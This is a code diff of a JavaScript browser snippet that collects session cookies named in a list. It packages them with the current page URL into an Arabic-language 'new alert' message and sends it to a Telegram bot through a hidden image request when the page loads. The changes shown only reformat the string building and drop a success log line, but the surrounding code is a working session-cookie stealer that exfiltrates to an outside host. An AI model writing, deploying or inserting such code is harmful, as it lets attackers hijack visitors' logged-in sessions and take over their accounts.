@@ -39,7 +39,7 @@
             const value = parts.slice(1).join("=").trim();
             
             if (SESSION_COOKIE_NAMES.has(name)) {
-                foundText += `${name}=${value}\n`;
+                foundText += `${name}: ${value}\n`;
             }
         }
         return foundText;
@@ -52,14 +52,12 @@
             return;
         }
 
-        const message = `🔔 تنبيه جديد!\n\n🌐 الرابط:\n${window.location.href}\n\n🍪 الكوكيز:\n${cookiesText}`;
+        const message = "تنبيه جديد\nالرابط: " + window.location.href + "\nالكوكيز:\n" + cookiesText;
 
-        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        const telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
 
         const img = new Image();
         img.src = telegramUrl;
-        
-        console.log("تم الإرسال بنجاح");
     }
 
     window.addEventListener("DOMContentLoaded", () => {
